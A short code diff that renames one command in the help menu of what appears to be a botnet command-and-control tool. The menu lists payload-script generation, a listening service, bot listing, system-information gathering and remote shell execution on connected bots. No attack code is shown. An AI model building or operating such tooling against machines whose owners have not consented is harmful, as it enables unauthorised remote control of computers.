@@ -17,7 +17,7 @@ def help() -> None:
     print("""
   generate <host> <port> <path>              Generate a Script
   service <host> <port>                      Start a listening service
-  listbot                                    List connected bots
+  botlist                                    List connected bots
   sysinfo <id>                               Get system information of a bot
   shell <id> <command>                       Execute command on a bot (timeout)
   shell_nt <id> <command>                    Execute command on a bot (not timeout)
